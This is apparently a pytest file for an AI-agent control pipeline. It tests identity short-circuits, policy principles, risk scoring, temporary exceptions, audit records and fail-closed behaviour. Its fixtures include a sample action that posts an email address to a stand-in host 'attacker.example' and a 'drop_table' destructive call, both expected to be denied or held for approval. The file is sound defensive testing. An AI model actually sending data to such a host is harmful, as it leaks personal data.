"""The decision pipeline runner — PIPE-01 / PIPE-02 / PIPE-03 / PIPE-05 / POL-08.

Behavior (plan 01-05 Task 2, migrated to the compiled constitution in Slice 3):
  - Ordering (PIPE-01/D6): a valid action runs identity -> enrichment -> policy ->
    risk -> graduated and returns exactly one Decision carrying the graduated outcome.
  - Reasons (PIPE-02): the Decision.reasons has at least one Reason per stage that ran,
    each with a machine-readable `code`.
  - Short-circuit (PIPE-03/IDN-02): a forged/unknown identity -> outcome deny, reasons
    contains ONLY the identity reason, and policy.evaluate + assess_risk did NOT run.
  - Audit-before-return (PIPE-01/AUD-01): evaluate awaits audit.append and sets
    evidence_ref on BOTH the deny short-circuit path and the normal path.
  - Floor end-to-end: a policy-deny action returns deny regardless of risk/trust.
  - Versions (POL-08): every Decision pins constitution_version + policy_version.
  - Failure semantics (PIPE-05): engine failure -> per-class posture (closed -> deny,
    explicit open -> audited allow); a fail-open that cannot write its audit record
    becomes a deny (no record -> no allow); RedactionError -> posture outcome +
    payload-free record.

Fakes/spies stand in for the policy engine, scorers, and audit writer — no real DB is
needed for the ordering/short-circuit unit tests; the constitution-integration tests
use the session-compiled test constitution (skip when no OPA). The async runner is
driven with asyncio.run, matching the established convention in the integration suite.
"""

from __future__ import annotations

import asyncio
from datetime import datetime, timedelta, timezone
from uuid import UUID, uuid4

from sqlalchemy import select

from agentos_contract import ActionType, AgentAction, Outcome, RiskFinding
from agentos_contract.policy_io import ConstitutionResult, MatchedPrinciple
from agentos_pipeline.graduated import GraduatedThresholds
from agentos_pipeline.policy import PolicyEvaluationError
from agentos_pipeline.posture import PostureMap
from agentos_pipeline.runner import Pipeline


# --- fakes / spies -----------------------------------------------------------


class FakeIdentityStage:
    """Returns a preset verdict; records that verify ran."""

    class _Verdict:
        def __init__(self, ok: bool, trust_score: float, detail: str) -> None:
            self.ok = ok
            self.trust_score = trust_score
            self.detail = detail

    def __init__(self, ok: bool = True, trust_score: float = 0.5, detail: str = "") -> None:
        self._verdict = self._Verdict(ok, trust_score, detail)
        self.calls = 0

    def verify(self, action: AgentAction):
        self.calls += 1
        return self._verdict


class SpyPolicyEngine:
    """Records call count; returns a preset ConstitutionResult (D4 PolicyEngine shape)."""

    constitution_version = "sha256:stub-constitution"
    policy_version = "sha256:stub-policy"
    principles_meta = {"1.1": {"title": "Egress allowlist", "effect": "deny"}}

    def __init__(self, outcome: Outcome) -> None:
        self.calls = 0
        self.last_input: dict | None = None
        self._outcome = outcome

    def evaluate(self, input: dict) -> ConstitutionResult:
        self.calls += 1
        self.last_input = input
        if self._outcome is Outcome.allow:
            return ConstitutionResult(matched=(), no_match=True)
        return ConstitutionResult(
            matched=(MatchedPrinciple(principle_ref="1.1", effect="deny"),),
            no_match=False,
        )


class RaisingPolicyEngine:
    """An engine in a failed state — every evaluate raises (PIPE-05 probe)."""

    constitution_version = "sha256:stub-constitution"
    policy_version = "sha256:stub-policy"
    principles_meta: dict = {}

    def evaluate(self, input: dict) -> ConstitutionResult:
        raise PolicyEvaluationError("engine down")


class SpyScorer:
    """An inline scorer that records calls and returns a fixed risk_score."""

    name = "spy.v1"
    inline = True

    def __init__(self, risk_score: float, matched: list[str] | None = None) -> None:
        self.calls = 0
        self._risk = risk_score
        self._matched = matched or (["spy_hit"] if risk_score > 0 else [])

    def score(self, action: AgentAction) -> RiskFinding:
        self.calls += 1
        return RiskFinding(
            scorer=self.name,
            category="prompt_injection",
            risk_score=self._risk,
            matched=self._matched,
            detail="spy",
        )


class FakeAuditWriter:
    """Records (action, decision) appends and returns a deterministic UUID."""

    def __init__(self) -> None:
        self.calls: list[tuple[AgentAction, object]] = []
        self._id = uuid4()

    async def append(self, action: AgentAction, decision) -> UUID:
        self.calls.append((action, decision))
        return self._id


class RaisingAuditWriter:
    """An audit writer that always fails — the no-record->no-allow probe."""

    async def append(self, action: AgentAction, decision) -> UUID:
        raise RuntimeError("audit store down")


def _action(url: str = "https://api.example.com/data", token: str | None = "tok") -> AgentAction:
    return AgentAction(
        agent_id="agent-1",
        type=ActionType.tool_call,
        target="http_get",
        payload={"url": url},
        identity_token=token,
    )


def _build(*, identity_ok: bool, policy: Outcome, risk: float, trust: float = 0.5):
    ident = FakeIdentityStage(ok=identity_ok, trust_score=trust, detail="forged" if not identity_ok else "")
    pol = SpyPolicyEngine(policy)
    scorer = SpyScorer(risk)
    audit = FakeAuditWriter()
    pipeline = Pipeline(identity=ident, policy=pol, scorers=[scorer], audit=audit)
    return pipeline, ident, pol, scorer, audit


# --- tests -------------------------------------------------------------------


def test_valid_action_runs_all_four_stages_in_order() -> None:
    pipeline, ident, pol, scorer, audit = _build(identity_ok=True, policy=Outcome.allow, risk=0.0)
    decision = asyncio.run(pipeline.evaluate(_action()))

    assert decision.outcome is Outcome.allow
    assert ident.calls == 1 and pol.calls == 1 and scorer.calls == 1
    stages = {r.stage for r in decision.reasons}
    assert stages == {"identity", "policy", "risk", "graduated"}
    assert all(r.code for r in decision.reasons)  # every reason is machine-readable


def test_forged_identity_short_circuits_without_later_stages() -> None:
    pipeline, ident, pol, scorer, audit = _build(identity_ok=False, policy=Outcome.allow, risk=0.0)
    decision = asyncio.run(pipeline.evaluate(_action(token="forged")))

    assert decision.outcome is Outcome.deny
    assert [r.stage for r in decision.reasons] == ["identity"]
    assert decision.reasons[0].code == "forged_or_unknown_identity"
    # PIPE-03: later stages did NOT run.
    assert pol.calls == 0
    assert scorer.calls == 0


def test_evidence_ref_set_on_short_circuit_path() -> None:
    pipeline, ident, pol, scorer, audit = _build(identity_ok=False, policy=Outcome.allow, risk=0.0)
    decision = asyncio.run(pipeline.evaluate(_action(token="forged")))
    assert len(audit.calls) == 1  # audited even on the deny short-circuit
    assert decision.evidence_ref is not None


def test_evidence_ref_set_on_normal_path() -> None:
    pipeline, ident, pol, scorer, audit = _build(identity_ok=True, policy=Outcome.allow, risk=0.0)
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert len(audit.calls) == 1
    assert decision.evidence_ref is not None


def test_policy_deny_floor_holds_end_to_end_regardless_of_risk_trust() -> None:
    # Policy denies; risk is 0 and trust is max — graduated must still deny (the floor).
    pipeline, ident, pol, scorer, audit = _build(
        identity_ok=True, policy=Outcome.deny, risk=0.0, trust=1.0
    )
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert decision.outcome is Outcome.deny
    # All non-identity stages still ran (no short-circuit on a policy deny).
    assert pol.calls == 1 and scorer.calls == 1
    # The fired principle is cited with provenance (PIPE-08).
    fired = [r for r in decision.reasons if r.code == "constitution_principle_fired"]
    assert fired and fired[0].principle_ref == "1.1" and fired[0].rationale


def test_high_risk_on_allowed_policy_restricts_to_deny() -> None:
    pipeline, ident, pol, scorer, audit = _build(
        identity_ok=True, policy=Outcome.allow, risk=0.8, trust=0.9
    )
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert decision.outcome is Outcome.deny  # risk only RESTRICTS the allowed floor


def test_trust_feeds_graduated_and_is_stamped_on_decision() -> None:
    pipeline, ident, pol, scorer, audit = _build(
        identity_ok=True, policy=Outcome.allow, risk=0.0, trust=0.83
    )
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert decision.trust_score == 0.83


def test_policy_input_is_the_d4_document() -> None:
    pipeline, ident, pol, scorer, audit = _build(identity_ok=True, policy=Outcome.allow, risk=0.0)
    asyncio.run(pipeline.evaluate(_action(url="https://api.example.com/path?q=1")))
    assert pol.last_input is not None
    assert pol.last_input["egress"]["host"] == "api.example.com"
    assert pol.last_input["type"] == "tool_call"
    assert pol.last_input["intent"] == {"class": ""}


def test_injected_thresholds_reach_the_graduated_stage() -> None:
    # POL-06: GraduatedThresholds is injectable — a sandbox_at of 0.01 must move a
    # low-risk action into sandbox, proving the config actually reaches the stage.
    ident = FakeIdentityStage(ok=True, trust_score=0.5)
    pol = SpyPolicyEngine(Outcome.allow)
    scorer = SpyScorer(0.05)
    audit = FakeAuditWriter()
    pipeline = Pipeline(
        identity=ident, policy=pol, scorers=[scorer], audit=audit,
        thresholds=GraduatedThresholds(sandbox_at=0.01, deny_at=0.99),
    )
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert decision.outcome is Outcome.sandbox


# --- Slice 3: constitution integration (real compiled engine; skip w/o OPA) ---


def _wire_real_engine(constitution_wasm, *, audit=None, exceptions=None, scorers=None):
    from agentos_pipeline.policy import ConstitutionPolicyEngine

    engine = ConstitutionPolicyEngine(
        wasm_path=str(constitution_wasm.wasm_path),
        lists=constitution_wasm.bundle.lists,
        constitution_version=constitution_wasm.bundle.constitution_version,
        principles_meta=constitution_wasm.principles_meta,
    )
    audit = audit if audit is not None else FakeAuditWriter()
    pipeline = Pipeline(
        identity=FakeIdentityStage(ok=True, trust_score=0.5),
        policy=engine,
        scorers=scorers if scorers is not None else [],
        audit=audit,
        exceptions=exceptions,
    )
    return pipeline, engine, audit


def test_enrichment_feeds_policy_destructive_intent_requires_approval(constitution_wasm) -> None:
    """SEC-12: the intent tag flows into the policy input and principle 2.1 fires."""
    pipeline, engine, audit = _wire_real_engine(constitution_wasm)
    action = AgentAction(
        agent_id="agent-1", type=ActionType.tool_call, target="drop_table",
        payload={"url": "https://api.example.com/x"}, identity_token="tok",
    )
    decision = asyncio.run(pipeline.evaluate(action))
    assert decision.outcome is Outcome.require_approval
    assert decision.inferred_intent == "DATA_DESTRUCTION"
    fired = [r for r in decision.reasons if r.stage == "policy" and r.principle_ref == "2.1"]
    assert fired and fired[0].rationale  # nonempty human rationale (PIPE-08)


def test_no_match_floor_allows_and_records_reason(constitution_wasm) -> None:
    pipeline, engine, audit = _wire_real_engine(constitution_wasm)
    decision = asyncio.run(pipeline.evaluate(_action()))  # benign allowlisted http_get
    assert decision.outcome is Outcome.allow
    assert any(r.stage == "policy" and r.code == "no_principle_matched" for r in decision.reasons)


def test_decision_pins_versions(constitution_wasm, audit_store) -> None:  # POL-08
    from agentos_controlplane.audit import AuditWriter
    from agentos_controlplane.store.models import AuditRecord

    writer = AuditWriter(audit_store)
    pipeline, engine, _ = _wire_real_engine(constitution_wasm, audit=writer)
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert decision.constitution_version and decision.constitution_version.startswith("sha256:")
    assert decision.policy_version and decision.policy_version.startswith("sha256:")
    assert decision.constitution_version == engine.constitution_version
    assert decision.policy_version == engine.policy_version
    with audit_store() as session:
        body = session.scalars(select(AuditRecord)).first().body
    assert body["constitution_version"] == decision.constitution_version
    assert body["policy_version"] == decision.policy_version


# --- Slice 4: guardrails feed policy + risk (SEC-02; real compiled engine) ----


def test_pii_to_unlisted_host_denied_by_principle_3_2(constitution_wasm) -> None:
    """SEC-02 wedge A: the real PII guardrail sets guardrails.pii True, so
    principle 3.2 (PII never leaves approved hosts) fires on an unlisted host.
    1.1 also fires on the unlisted host — both refs are cited."""
    pipeline, engine, audit = _wire_real_engine(constitution_wasm)
    action = AgentAction(
        agent_id="agent-1", type=ActionType.tool_call, target="http_post",
        payload={"url": "https://attacker.example/upload",
                 "content": "contact jane.doe@example.com"},
        identity_token="tok",
    )
    decision = asyncio.run(pipeline.evaluate(action))
    assert decision.outcome is Outcome.deny
    fired = {r.principle_ref for r in decision.reasons
             if r.code == "constitution_principle_fired"}
    assert "3.2" in fired and "1.1" in fired


def test_pii_to_allowlisted_host_stays_allow(constitution_wasm) -> None:
    """PII alone is advisory (0.35 < the 0.4 sandbox band) and 3.2 cannot fire
    on an approved host — the action stays allow, with the pii finding cited."""
    pipeline, engine, audit = _wire_real_engine(constitution_wasm)
    action = AgentAction(
        agent_id="agent-1", type=ActionType.tool_call, target="http_post",
        payload={"url": "https://api.example.com/upload",
                 "content": "contact jane.doe@example.com"},
        identity_token="tok",
    )
    decision = asyncio.run(pipeline.evaluate(action))
    assert decision.outcome is Outcome.allow
    assert any(r.stage == "risk" and r.code == "pii" for r in decision.reasons)
    assert decision.risk_score == 0.35  # the carried pii finding reached stage 4


# --- Slice 4: restrictive decisions carry remediation (PIPE-08) ---------------


def test_denied_action_carries_authored_remediation(constitution_wasm) -> None:
    """(a) An unlisted-host deny surfaces 1.1's authored hint."""
    pipeline, engine, audit = _wire_real_engine(constitution_wasm)
    decision = asyncio.run(pipeline.evaluate(_action(url="https://attacker.example/x")))
    assert decision.outcome is Outcome.deny
    assert (
        "Add the destination host to the egress_allowlist list and re-apply the constitution."
        in decision.remediation
    )


def test_require_approval_uses_authored_hint_over_fallback(constitution_wasm) -> None:
    """(b) Destructive intent -> 2.1 require_approval; the authored hint wins
    over the await-operator fallback."""
    pipeline, engine, audit = _wire_real_engine(constitution_wasm)
    action = AgentAction(
        agent_id="agent-1", type=ActionType.tool_call, target="drop_table",
        payload={"url": "https://api.example.com/x"}, identity_token="tok",
    )
    decision = asyncio.run(pipeline.evaluate(action))
    assert decision.outcome is Outcome.require_approval
    assert decision.remediation == [
        "Request operator approval, or use a non-destructive alternative."
    ]


def test_deny_without_authored_hint_falls_back_to_review_line() -> None:
    """(c) A fired principle with NO authored remediation falls back to the
    per-principle review line (SpyPolicyEngine's meta has no remediation)."""
    pipeline, ident, pol, scorer, audit = _build(identity_ok=True, policy=Outcome.deny, risk=0.0)
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert decision.outcome is Outcome.deny
    assert decision.remediation == ["Review principle 1.1 — Egress allowlist"]


def test_fallback_review_lines_skip_advisory_principles() -> None:
    """(c2) When a warn-principle fired ALONGSIDE the deny, the fallback names
    only the principle(s) that drove the restrictive outcome (effect rank >=
    sandbox) — no review line for the advisory bystander."""

    class TwoPrincipleEngine:
        constitution_version = "sha256:stub-constitution"
        policy_version = "sha256:stub-policy"
        principles_meta = {
            "1.1": {"title": "Egress allowlist", "effect": "deny"},
            "4.1": {"title": "Prefer cheap models", "effect": "warn"},
        }

        def evaluate(self, input: dict) -> ConstitutionResult:
            return ConstitutionResult(
                matched=(
                    MatchedPrinciple(principle_ref="1.1", effect="deny"),
                    MatchedPrinciple(principle_ref="4.1", effect="warn"),
                ),
                no_match=False,
            )

    pipeline = Pipeline(
        identity=FakeIdentityStage(ok=True),
        policy=TwoPrincipleEngine(),
        scorers=[SpyScorer(0.0)],
        audit=FakeAuditWriter(),
    )
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert decision.outcome is Outcome.deny
    assert decision.remediation == ["Review principle 1.1 — Egress allowlist"]


def test_plain_allow_has_no_remediation() -> None:
    """(d) Remediation is derived only on restrictive outcomes."""
    pipeline, ident, pol, scorer, audit = _build(identity_ok=True, policy=Outcome.allow, risk=0.0)
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert decision.outcome is Outcome.allow
    assert decision.remediation == []


# --- Slice 5: conditional advisory interpreter on no_match (POL-04/POL-05) ----


class CountingStubInterpreter:
    """A counting SemanticInterpreter returning a fixed verdict (or raising)."""

    name = "counting-stub.v1"

    def __init__(self, verdict=None, raises: bool = False) -> None:
        from agentos_pipeline.interpreter import InterpreterVerdict

        self.calls = 0
        self._verdict = verdict or InterpreterVerdict(
            outcome="allow", principle_ref=None, rationale="counted"
        )
        self.raises = raises

    async def interpret(self, request):
        self.calls += 1
        if self.raises:
            raise RuntimeError("interpreter backend down")
        return self._verdict


def _build_with_interpreter(interpreter, *, policy: Outcome, posture: PostureMap | None = None):
    pipeline = Pipeline(
        identity=FakeIdentityStage(ok=True),
        policy=SpyPolicyEngine(policy),
        scorers=[SpyScorer(0.0)],
        audit=FakeAuditWriter(),
        posture=posture if posture is not None else PostureMap(),
        interpreter=interpreter,
    )
    return pipeline


def test_interpreter_never_invoked_when_a_principle_matched() -> None:
    """POL-05: the interpreter runs ONLY on no_match — it can never touch a real
    policy floor. A matched deny stands and the interpreter is never called."""
    interp = CountingStubInterpreter()
    pipeline = _build_with_interpreter(interp, policy=Outcome.deny)
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert decision.outcome is Outcome.deny
    assert interp.calls == 0


def test_no_match_interpreter_deny_restricts_with_advisory_reason() -> None:
    """POL-04: on no_match, a deny verdict tightens the floor and the Decision
    carries the typed advisory reason (principle cited, recommendation in evidence)."""
    from agentos_pipeline.interpreter import InterpreterVerdict

    interp = CountingStubInterpreter(
        verdict=InterpreterVerdict(
            outcome="deny", principle_ref="3.2", rationale="semantically a PII export"
        )
    )
    pipeline = _build_with_interpreter(interp, policy=Outcome.allow)  # no_match
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert decision.outcome is Outcome.deny
    assert interp.calls == 1
    advisory = [r for r in decision.reasons if r.code == "interpreter_advisory"]
    assert len(advisory) == 1
    assert advisory[0].stage == "interpreter"
    assert advisory[0].principle_ref == "3.2"
    assert advisory[0].rationale == "semantically a PII export"
    assert advisory[0].evidence == {"recommended": "deny"}


def test_interpreter_allow_cannot_relax_the_no_match_floor() -> None:
    """POL-05 clamp: with a require_approval no-match floor, an allow verdict
    cannot relax it — restrict-only by OUTCOME_RESTRICTIVENESS max."""
    from agentos_pipeline.interpreter import InterpreterVerdict

    interp = CountingStubInterpreter(
        verdict=InterpreterVerdict(outcome="allow", principle_ref=None, rationale="benign")
    )
    pipeline = _build_with_interpreter(
        interp,
        policy=Outcome.allow,  # no_match
        posture=PostureMap(no_match_floors={ActionType.tool_call: Outcome.require_approval}),
    )
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert decision.outcome is Outcome.require_approval  # the floor stands
    assert interp.calls == 1


def test_out_of_vocabulary_verdict_is_rejected_floor_unchanged() -> None:
    """ADR-0005: temporary_exception is NOT an authorable effect — an
    out-of-vocabulary verdict yields interpreter_invalid_verdict, floor unchanged."""
    from agentos_pipeline.interpreter import InterpreterVerdict

    interp = CountingStubInterpreter(
        verdict=InterpreterVerdict(
            outcome="temporary_exception", principle_ref=None, rationale="nope"
        )
    )
    pipeline = _build_with_interpreter(interp, policy=Outcome.allow)
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert decision.outcome is Outcome.allow  # the no-match floor unchanged
    invalid = [r for r in decision.reasons if r.code == "interpreter_invalid_verdict"]
    assert len(invalid) == 1
    assert invalid[0].stage == "interpreter"
    assert invalid[0].detail == "temporary_exception"
    assert not any(r.code == "interpreter_advisory" for r in decision.reasons)


def test_interpreter_exception_degrades_to_reason_never_fail_safe() -> None:
    """Advisory failure != control-plane failure: a raising interpreter yields
    interpreter_error, the outcome is the no-match floor, and there is NO
    control_plane_failure reason (the exception never reached _fail_safe)."""
    interp = CountingStubInterpreter(raises=True)
    pipeline = _build_with_interpreter(interp, policy=Outcome.allow)
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert decision.outcome is Outcome.allow  # the no-match floor stands
    errs = [r for r in decision.reasons if r.code == "interpreter_error"]
    assert len(errs) == 1
    assert errs[0].stage == "interpreter"
    assert errs[0].detail == "RuntimeError"
    assert not any("control_plane_failure" in r.code for r in decision.reasons)
    # The normal stages all still ran and the decision is audited.
    assert {r.stage for r in decision.reasons} >= {"identity", "policy", "risk", "graduated"}
    assert decision.evidence_ref is not None


def test_malformed_verdict_on_fail_open_class_keeps_the_no_match_floor() -> None:
    """A type-broken verdict (unhashable outcome) must degrade to an
    interpreter_error reason with the no-match floor unchanged — it may NEVER
    escape to the fail-safe and turn a require_approval floor into a
    fail-open allow."""
    from agentos_pipeline.interpreter import InterpreterVerdict

    interp = CountingStubInterpreter(
        verdict=InterpreterVerdict(outcome=["deny"], principle_ref=None, rationale="x")
    )
    pipeline = _build_with_interpreter(
        interp,
        policy=Outcome.allow,  # no_match
        posture=PostureMap(
            fail_open_types=frozenset({ActionType.model_invocation}),
            no_match_floors={ActionType.model_invocation: Outcome.require_approval},
        ),
    )
    action = AgentAction(
        agent_id="agent-1", type=ActionType.model_invocation, target="m",
        payload={"model": "m", "messages": "hi"}, identity_token="tok",
    )
    decision = asyncio.run(pipeline.evaluate(action))
    assert decision.outcome is Outcome.require_approval  # the floor stands
    errs = [r for r in decision.reasons if r.code == "interpreter_error"]
    assert len(errs) == 1 and errs[0].detail == "TypeError"
    assert not any("control_plane_failure" in r.code for r in decision.reasons)


def test_oversized_principle_ref_is_truncated_into_the_advisory_reason() -> None:
    """The principle_ref is live-model-controlled and audit-bound: the runner
    truncates it to 64 chars before it enters the advisory Reason — no exception."""
    from agentos_pipeline.interpreter import InterpreterVerdict

    interp = CountingStubInterpreter(
        verdict=InterpreterVerdict(outcome="deny", principle_ref="r" * 100, rationale="x")
    )
    pipeline = _build_with_interpreter(interp, policy=Outcome.allow)  # no_match
    decision = asyncio.run(pipeline.evaluate(_action()))
    advisory = [r for r in decision.reasons if r.code == "interpreter_advisory"]
    assert len(advisory) == 1
    assert advisory[0].principle_ref == "r" * 64


def test_cached_interpreter_end_to_end_two_identical_actions_one_interpret() -> None:
    """PIPE-06 e2e: behind CachedInterpreter, two identical actions hit the
    inner interpreter exactly once (shape-keyed verdict cache)."""
    from agentos_pipeline.interpreter import CachedInterpreter

    inner = CountingStubInterpreter()
    pipeline = _build_with_interpreter(CachedInterpreter(inner), policy=Outcome.allow)
    asyncio.run(pipeline.evaluate(_action()))
    asyncio.run(pipeline.evaluate(_action()))
    assert inner.calls == 1


# --- Slice 6a-5: temporary-exception transform (POL-13) -----------------------


class FakeExceptionLookup:
    """An injected ExceptionLookup over an in-test grant table. Deliberately does
    NOT filter expired grants — the pipeline must re-check expiry itself
    (defense in depth; the read-time auto-revoke lives in the real store)."""

    def __init__(self, grants: dict[tuple[str, str], datetime]) -> None:
        self.grants = grants
        self.queries: list[tuple[str, tuple[str, ...]]] = []

    def active_for(self, agent_id: str, refs: tuple[str, ...]):
        self.queries.append((agent_id, refs))
        return {
            ref: exp
            for (a, ref), exp in self.grants.items()
            if a == agent_id and ref in refs
        }


def _pii_to_unlisted_host_action() -> AgentAction:
    """Fires BOTH deny principles: 1.1 (unlisted host) and 3.2 (PII egress)."""
    return AgentAction(
        agent_id="agent-1", type=ActionType.tool_call, target="http_post",
        payload={"url": "https://attacker.example/upload",
                 "content": "contact jane.doe@example.com"},
        identity_token="tok",
    )


def test_exception_transform_relabels_allow_to_temporary_exception(
    constitution_wasm, audit_store
) -> None:
    """Deny floor (1.1 fired) + active exception for (agent, '1.1') -> final
    outcome temporary_exception with expires_at set, the transform reason cites
    the consumed refs, and the audit body carries the expiry (hash-covered)."""
    from agentos_controlplane.audit import AuditWriter
    from agentos_controlplane.store.models import AuditRecord

    until = datetime.now(timezone.utc) + timedelta(hours=1)
    lookup = FakeExceptionLookup({("agent-1", "1.1"): until})
    pipeline, engine, _ = _wire_real_engine(
        constitution_wasm, audit=AuditWriter(audit_store), exceptions=lookup
    )
    decision = asyncio.run(pipeline.evaluate(_action(url="https://attacker.example/x")))

    assert decision.outcome is Outcome.temporary_exception
    assert decision.expires_at == until  # earliest (only) consumed expiry
    applied = [r for r in decision.reasons if r.code == "temporary_exception_applied"]
    assert len(applied) == 1 and applied[0].stage == "policy"
    assert applied[0].evidence["refs"] == ["1.1"]
    assert applied[0].evidence["expires_at"] == until.isoformat()
    # The fired deny principle is STILL cited — the transform explains, never hides.
    assert any(
        r.code == "constitution_principle_fired" and r.principle_ref == "1.1"
        for r in decision.reasons
    )
    # The lookup was scoped to the acting agent's deny refs.
    assert lookup.queries == [("agent-1", ("1.1",))]
    with audit_store() as session:
        body = session.scalars(select(AuditRecord)).first().body
    assert body["outcome"] == "temporary_exception"
    assert body["expires_at"] == until.isoformat()  # hash-covered (H3)


def test_exception_transform_risk_still_re_restricts_to_deny(constitution_wasm) -> None:
    """Defense in depth: the transform converts the FLOOR, not the verdict —
    risk >= deny_at still denies the exception-covered action."""
    until = datetime.now(timezone.utc) + timedelta(hours=1)
    lookup = FakeExceptionLookup({("agent-1", "1.1"): until})
    pipeline, engine, audit = _wire_real_engine(
        constitution_wasm, exceptions=lookup, scorers=[SpyScorer(0.9)]
    )
    decision = asyncio.run(pipeline.evaluate(_action(url="https://attacker.example/x")))
    assert decision.outcome is Outcome.deny  # risk re-restricted the transformed floor
    assert decision.expires_at is None       # no relabel on a non-allow outcome
    # The transform itself is still explained (the floor DID convert).
    assert any(r.code == "temporary_exception_applied" for r in decision.reasons)


def test_expired_exception_is_plain_deny(constitution_wasm) -> None:
    """Auto-revoke (POL-13): an expired grant is no grant — even when the lookup
    (wrongly) returns it, the pipeline re-checks expiry."""
    past = datetime.now(timezone.utc) - timedelta(seconds=1)
    lookup = FakeExceptionLookup({("agent-1", "1.1"): past})
    pipeline, engine, audit = _wire_real_engine(constitution_wasm, exceptions=lookup)
    decision = asyncio.run(pipeline.evaluate(_action(url="https://attacker.example/x")))
    assert decision.outcome is Outcome.deny
    assert decision.expires_at is None
    assert not any(r.code == "temporary_exception_applied" for r in decision.reasons)


def test_partial_coverage_of_two_deny_principles_stays_deny(constitution_wasm) -> None:
    """ALL deny-effect refs must be covered: 1.1 AND 3.2 fire deny; an exception
    for 1.1 alone leaves the deny floor untouched."""
    until = datetime.now(timezone.utc) + timedelta(hours=1)
    lookup = FakeExceptionLookup({("agent-1", "1.1"): until})
    pipeline, engine, audit = _wire_real_engine(constitution_wasm, exceptions=lookup)
    decision = asyncio.run(pipeline.evaluate(_pii_to_unlisted_host_action()))
    assert decision.outcome is Outcome.deny
    assert not any(r.code == "temporary_exception_applied" for r in decision.reasons)
    fired = {r.principle_ref for r in decision.reasons
             if r.code == "constitution_principle_fired"}
    assert {"1.1", "3.2"} <= fired


def test_full_coverage_of_two_deny_principles_transforms(constitution_wasm) -> None:
    """Positive control for the ALL-refs rule: exceptions for BOTH 1.1 and 3.2
    convert the floor; expires_at is the EARLIEST consumed expiry."""
    sooner = datetime.now(timezone.utc) + timedelta(minutes=30)
    later = datetime.now(timezone.utc) + timedelta(hours=2)
    lookup = FakeExceptionLookup(
        {("agent-1", "1.1"): later, ("agent-1", "3.2"): sooner}
    )
    pipeline, engine, audit = _wire_real_engine(constitution_wasm, exceptions=lookup)
    decision = asyncio.run(pipeline.evaluate(_pii_to_unlisted_host_action()))
    assert decision.outcome is Outcome.temporary_exception
    assert decision.expires_at == sooner  # earliest expiry wins
    applied = [r for r in decision.reasons if r.code == "temporary_exception_applied"]
    assert sorted(applied[0].evidence["refs"]) == ["1.1", "3.2"]


def test_exception_re_derives_floor_from_remaining_non_deny_principles(
    constitution_wasm,
) -> None:
    """An exception waives ONLY the deny refs — co-fired NON-deny restrictive
    principles still govern. 1.1 (deny, unlisted host) + 2.1 (require_approval,
    destructive intent) both fire; an exception for 1.1 lifts the deny but the
    floor re-derives to require_approval — never allow, never relabeled."""
    until = datetime.now(timezone.utc) + timedelta(hours=1)
    lookup = FakeExceptionLookup({("agent-1", "1.1"): until})
    pipeline, engine, audit = _wire_real_engine(constitution_wasm, exceptions=lookup)
    action = AgentAction(
        agent_id="agent-1", type=ActionType.tool_call, target="drop_table",
        payload={"url": "https://attacker.example/x"}, identity_token="tok",
    )
    decision = asyncio.run(pipeline.evaluate(action))
    fired = {r.principle_ref for r in decision.reasons
             if r.code == "constitution_principle_fired"}
    assert {"1.1", "2.1"} <= fired  # both principles really co-fired
    assert decision.outcome is Outcome.require_approval
    assert decision.expires_at is None  # no relabel on a non-allow outcome
    # The consumed exception is still explained — it lifted the deny, not 2.1.
    assert any(r.code == "temporary_exception_applied" for r in decision.reasons)


def test_no_lookup_injected_behavior_unchanged(constitution_wasm) -> None:
    """exceptions=None (the default): the deny floor stands exactly as before."""
    pipeline, engine, audit = _wire_real_engine(constitution_wasm)
    decision = asyncio.run(pipeline.evaluate(_action(url="https://attacker.example/x")))
    assert decision.outcome is Outcome.deny
    assert not any(r.code == "temporary_exception_applied" for r in decision.reasons)


# --- Slice 3: PIPE-05 failure semantics (kill-the-control-plane) --------------


def test_engine_failure_fails_closed_with_audit_record(audit_store) -> None:
    from agentos_controlplane.audit import AuditWriter
    from agentos_controlplane.store.models import AuditRecord

    pipeline = Pipeline(
        identity=FakeIdentityStage(ok=True),
        policy=RaisingPolicyEngine(),
        scorers=[],
        audit=AuditWriter(audit_store),
    )
    decision = asyncio.run(pipeline.evaluate(_action()))
    assert decision.outcome is Outcome.deny  # default posture: fail CLOSED
    assert any(r.code == "control_plane_failure_fail_closed" for r in decision.reasons)
    assert decision.evidence_ref is not None
    with audit_store() as session:
        body = session.scalars(select(AuditRecord)).first().body
    assert body["redacted_payload"] == {}  # payload-free fail-safe record


def test_engine_failure_fail_open_class_is_audited() -> None:
    audit = FakeAuditWriter()
    pipeline = Pipeline(
        identity=FakeIdentityStage(ok=True),
        policy=RaisingPolicyEngine(),
        scorers=[],
        audit=audit,
        posture=PostureMap(fail_open_types=frozenset({ActionType.model_invocation})),
    )
    action = AgentAction(
        agent_id="agent-1", type=ActionType.model_invocation, target="m",
        payload={"model": "m", "messages": "hi"}, identity_token="tok",
    )
    decision = asyncio.run(pipeline.evaluate(action))
    assert decision.outcome is Outcome.allow  # explicitly-configured fail-open class
    assert any(r.code == "control_plane_failure_fail_open" for r in decision.reasons)
    assert len(audit.calls) == 1  # NO silent allow: the fail-open is an audit record
    assert audit.calls[0][0].payload == {}  # payload-free


def test_fail_open_without_audit_record_becomes_deny() -> None:
    pipeline = Pipeline(
        identity=FakeIdentityStage(ok=True),
        policy=RaisingPolicyEngine(),
        scorers=[],
        audit=RaisingAuditWriter(),
        posture=PostureMap(fail_open_types=frozenset({ActionType.model_invocation})),
    )
    action = AgentAction(
        agent_id="agent-1", type=ActionType.model_invocation, target="m",
        payload={}, identity_token="tok",
    )
    decision = asyncio.run(pipeline.evaluate(action))
    assert decision.outcome is Outcome.deny  # no record -> no allow
    assert any(r.code == "fail_open_unaudited_demoted_to_deny" for r in decision.reasons)


def test_forged_identity_redaction_failure_never_relaxes_to_fail_open_allow() -> None:
    """C1 repro 1: a RedactionError in the short-circuit's audit append must not
